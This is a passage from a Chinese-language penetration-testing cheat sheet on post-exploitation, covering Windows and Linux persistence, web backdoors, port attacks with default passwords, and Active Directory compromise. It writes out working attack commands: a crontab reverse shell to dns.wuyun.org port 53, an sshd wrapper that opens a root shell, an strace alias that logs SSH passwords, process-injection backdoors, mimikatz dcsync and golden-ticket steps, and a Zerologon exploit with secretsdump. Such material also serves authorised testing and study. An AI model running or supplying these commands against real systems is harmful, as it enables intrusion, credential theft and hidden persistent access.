<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe "></a>19、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe </a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe<br>POC : <a target="_blank" rel="noopener" href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门<br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用VSTO实现的office后门</a><br><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Office-Persistence">Office加载项</a></p>
<ul>
<li>Word WLL </li>
<li>Excel XLL </li>
<li>Excel VBA add-ins </li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p>
</blockquote>
<blockquote>
<p>参考2 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序<br>POC:<a target="_blank" rel="noopener" href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测<br>利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限<br>通过修改注册表实现<br>POC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a> </p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限<br>通过修改注册表实现</p>
<pre><code>HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;
HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;
HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;
HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;
</code></pre>
<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载<br>Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧——“隐藏”注册表的创建》</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数<br>POC : <a target="_blank" rel="noopener" href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5><pre><code>New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null
</code></pre>
<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用BHO实现IE浏览器劫持</a></h5><h4 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<pre><code>#!bash
(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre>
<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><pre><code>#!bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
</code></pre>
<p>链接：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#48;&#54;&#46;&#49;&#52;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#48;&#54;&#46;&#49;&#52;&#50;</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><pre><code>#!bash
cd /usr/sbin
mv sshd ../bin
echo &#39;#!/usr/bin/perl&#39; &gt;sshd
echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd
echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd
chmod u+x sshd
//不用重启也行
/etc/init.d/sshd restart
</code></pre>
<pre><code>socat STDIO TCP4:192.168.206.142:22,sourceport=13377
</code></pre>
<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<pre><code>#!bash
alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;
</code></pre>
<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><pre><code>./cymothoa -p 2270 -s 1 -y 7777
</code></pre>
<pre><code>nc -vv ip 7777
</code></pre>
<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><ul>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit </a></li>
<li>Mafix + Suterusu rootkit</li>
</ul>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Screetsec/Vegile">Vegile </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/icco/backdoor">backdoor </a></li>
</ul>
<h3 id="WEB后门"><a href="#WEB后门" class="headerlink" title="WEB后门"></a>WEB后门</h3><p>PHP Meterpreter后门<br>Aspx Meterpreter后门<br>weevely<br>webacoo<br>….</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
<li>1.端口的指纹信息（版本信息） </li>
<li>2.端口所对应运行的服务  </li>
<li>3.常见的默认端口号  </li>
<li>4.尝试弱口令</li>
</ul>
<h4 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h4><p><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">hydra </a></p>
<h4 id="端口弱口令"><a href="#端口弱口令" class="headerlink" title="端口弱口令"></a>端口弱口令</h4><ul>
<li>NTScan  </li>
<li>Hscan  </li>
<li>自写脚本</li>
</ul>
<h4 id="端口溢出"><a href="#端口溢出" class="headerlink" title="端口溢出"></a>端口溢出</h4><p><strong>smb</strong></p>
<ul>
<li>ms08067 </li>
<li>ms17010 </li>
<li>ms11058 </li>
<li>…</li>
</ul>
<p><strong>apache</strong><br><strong>ftp</strong><br><strong>…</strong></p>
<h4 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h4><h5 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞&#x2F;敏感目录)"></a>1、web类(web漏洞&#x2F;敏感目录)</h5><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p>
<pre><code>80 web 
80-89 web 
8000-9090 web 
</code></pre>
<h5 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h5><pre><code>1433 MSSQL 
1521 Oracle 
3306 MySQL 
5432 PostgreSQL 
50000 DB2
</code></pre>
<h5 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)"></a>3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</h5><pre><code>443 SSL心脏滴血 
445 ms08067/ms11058/ms17010等 
873 Rsync未授权 
5984 CouchDB http://xxx:5984/_utils/ 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
50000 SAP命令执行 
50070,50030 hadoop默认端口未授权访问 
</code></pre>
<h5 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令&#x2F;端口爆破)"></a>4、常用端口类(扫描弱口令&#x2F;端口爆破)</h5><pre><code>21 ftp 
22 SSH 
23 Telnet 
445 SMB弱口令扫描 
2601,2604 zebra路由，默认密码zebra 
3389 远程桌面 
</code></pre>
<h5 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h5><pre><code>21 ftp 
22 SSH 
23 Telnet 
25 SMTP 
53 DNS 
69 TFTP 
80 web 
80-89 web 
110 POP3 
135 RPC 
139 NETBIOS 
143 IMAP 
161 SNMP 
389 LDAP 
443 SSL心脏滴血以及一些web漏洞测试 
445 SMB 
512,513,514 Rexec 
873 Rsync未授权 
1025,111 NFS 
1080 socks 
1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 
1433 MSSQL (暴力破解) 
1521 Oracle:(iSqlPlus Port:5560,7778) 
2082/2083 cpanel主机管理系统登陆 （国外用较多） 
2222 DA虚拟主机管理系统登陆 （国外用较多） 
2601,2604 zebra路由，默认密码zebra 
3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 
3306 MySQL （暴力破解） 
3312/3311 kangle主机管理系统登陆 
3389 远程桌面 
3690 svn 
4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 
4848 GlassFish web中间件 弱口令:admin/adminadmin 
5432 PostgreSQL 
5900 vnc 
5984 CouchDB http://xxx:5984/_utils/ 
6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
7778 Kloxo主机控制面板登录 
8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 
8080 tomcat/WDCd/ 主机管理系统，默认弱口令 
8080,8089,9090 JBOSS 
8081 Symantec AV/Filter for MSE 
8083 Vestacp主机管理系统 （国外用较多） 
8649 ganglia 
8888 amh/LuManager 主机管理系统默认端口 
9000 fcgi fcig php执行 
9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
10000 Virtualmin/Webmin 服务器虚拟主机管理系统 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
28017 mongodb统计页面 
50000 SAP命令执行 
50060 hadoop 
50070,50030 hadoop默认端口未授权访问
</code></pre>
<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><h5 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview.ps1"></a>powerview.ps1</h5><pre><code>Get-NetDomain - gets the name of the current user&#39;s domain
Get-NetForest - gets the forest associated with the current user&#39;s domain
Get-NetForestDomains - gets all domains for the current forest
Get-NetDomainControllers - gets the domain controllers for the current computer&#39;s domain
Get-NetCurrentUser - gets the current [domain\]username
Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)
Get-NetUserSPNs - gets all user ServicePrincipalNames
Get-NetOUs - gets data for domain organization units
Get-NetGUIDOUs - finds domain OUs linked to a specific GUID
Invoke-NetUserAdd - adds a local or domain user
Get-NetGroups - gets a list of all current groups in the domain
Get-NetGroup - gets data for each user in a specified domain group
Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts
Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts
Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts
Invoke-NetGroupUserAdd - adds a user to a specified local or domain group
Get-NetComputers - gets a list of all current servers in the domain
Get-NetFileServers - get a list of file servers used by current domain users
Get-NetShare - gets share information for a specified server
Get-NetLoggedon - gets users actively logged onto a specified server
Get-NetSessions - gets active sessions on a specified server
Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles
Get-NetConnections - gets active connections to a specific server resource (share)
Get-NetFiles - gets open files on a server
Get-NetProcesses - gets the remote processes and owners on a remote server
</code></pre>
<p>PowerView-2.0-tricks:</p>
<pre><code>https://gist.github.com/HarmJ0y/3328d954607d71362e3c
</code></pre>
<p>PowerView-3.0-tricks</p>
<pre><code>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
</code></pre>
<h5 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h5><p><strong>获取某OU下所有机器信息</strong></p>
<pre><code>&#123;
            &quot;name&quot;: &quot;Find the specificed OU computers&quot;,
            &quot;queryList&quot;: [
                &#123;
                    &quot;final&quot;: false,
                    &quot;title&quot;: &quot;Select a OU...&quot;,
                    &quot;query&quot;: &quot;MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC&quot;
                &#125;,
                &#123;
                    &quot;final&quot;: true,
                    &quot;query&quot;: &quot;MATCH (m:OU  &#123;name: $result&#125;) with m MATCH p=(o:OU &#123;objectid: m.objectid&#125;)-[r:Contains*1..]-&gt;(n:Computer) RETURN p&quot;,
                    &quot;allowCollapse&quot;: true,
                    &quot;endNode&quot;: &quot;&#123;&#125;&quot;
                &#125;
            ]
        &#125;
</code></pre>
<p><strong>自动标记owned用户及机器</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Lz1y/SyncDog">SyncDog</a></p>
<h5 id="获取域内DNS信息"><a href="#获取域内DNS信息" class="headerlink" title="获取域内DNS信息"></a>获取域内DNS信息</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a></li>
<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96">域渗透——DNS记录的获取</a><br>​</li>
</ul>
<h4 id="获取域控的方法"><a href="#获取域控的方法" class="headerlink" title="获取域控的方法"></a>获取域控的方法</h4><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。<br>相关阅读: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/42175.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好） </a></li>
<li><a target="_blank" rel="noopener" href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹 </a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项 </a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><pre><code>python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
</code></pre>
<p>利用mimikatz将工具得到的<a href="mailto:&#84;&#x47;&#84;&#x5f;&#100;&#x6f;&#x6d;&#97;&#x69;&#110;&#117;&#115;&#x65;&#x72;&#x40;&#x53;&#x45;&#x52;&#86;&#x45;&#x52;&#x2e;&#x43;&#x4f;&#x4d;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;">&#84;&#x47;&#84;&#x5f;&#100;&#x6f;&#x6d;&#97;&#x69;&#110;&#117;&#115;&#x65;&#x72;&#x40;&#x53;&#x45;&#x52;&#86;&#x45;&#x52;&#x2e;&#x43;&#x4f;&#x4d;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;</a>写入内存，创建缓存证书：</p>
<pre><code>mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit
net use k: \pentest.comc$
</code></pre>
<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a> </li>
<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></li>
</ul>
<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。<br>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a> </li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN扫描</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
<pre><code>lsadump::dcsync /domain:pentest.com /user:krbtgt
</code></pre>
<pre><code>kerberos::purge
kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi
kerberos::ptt administrator.kiribi
kerberos::tgt
net use k: \pnet use k: \pentest.comc$
</code></pre>
<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a> </li>
<li><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a> </li>
<li><a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限<br>银票：伪造TGS，<code>只能访问指定的服务</code><br>加密方式不同：<br>Golden Ticket由<code>krbtgt</code>的hash加密<br>Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信<br>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">攻击者如何使用Kerberos的银票来利用系统</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf">域渗透——Pass The Ticket</a></li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理<br><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a><br>获取所有用作SPN的帐户</p>
<pre><code>setspn -T PENTEST.com -Q */*
</code></pre>
<p>从Mimikatz的RAM中提取获得的门票</p>
<pre><code>kerberos::list /export
</code></pre>
<p>用rgsrepcrack破解</p>
<pre><code>tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
</code></pre>
<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码 </p>
<h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h5><ul>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li>
</ul>
<p>用于主动让目标机器发起NTLM请求的方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
</ul>
<p>Relay LDAP:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li>
</ul>
<p>Relay AD CS&#x2F;PKI:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS&#x2F;PKI template exploit</a></li>
</ul>
<p>集成几个利用的工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Relayx">Relayx</a></li>
</ul>
<p>内网445端口转发：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">PortBender</a></li>
</ul>
<h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h5><ul>
<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.harmj0y.net/activedirectory/s4u2pwnage/">s4u2pwnage</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li>
</ul>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP </p>
<h5 id="Zerologon"><a href="#Zerologon" class="headerlink" title="Zerologon"></a>Zerologon</h5><p>1、利用Mimikatz<br><strong>check</strong></p>
<pre><code>lsadump::zerologon /target:dc1.exploit.local /account:dc1$
</code></pre>
<p><strong>exploit</strong></p>
<pre><code>lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit
</code></pre>
<p><strong>dcsync</strong></p>
<pre><code>lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgt
</code></pre>
<p><strong>restore</strong></p>
<pre><code>lsadump::postzerologon /target:conttosson.locl /account:dc$ 
</code></pre>
<p>2、利用impacket：</p>
<ul>
<li>取目标主机名+IP</li>
<li>install 修改版本的impacket</li>
<li>Exp</li>
</ul>
<pre><code>python cve-2020-1472-exploit.py DC2008 10.211.55.200
</code></pre>
<p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190137.png"></p>
<pre><code>secretsdump.py -no-pass cgdomain.com/&#39;DC2008$&#39;@10.211.55.200 -history -just-dc-user administrator
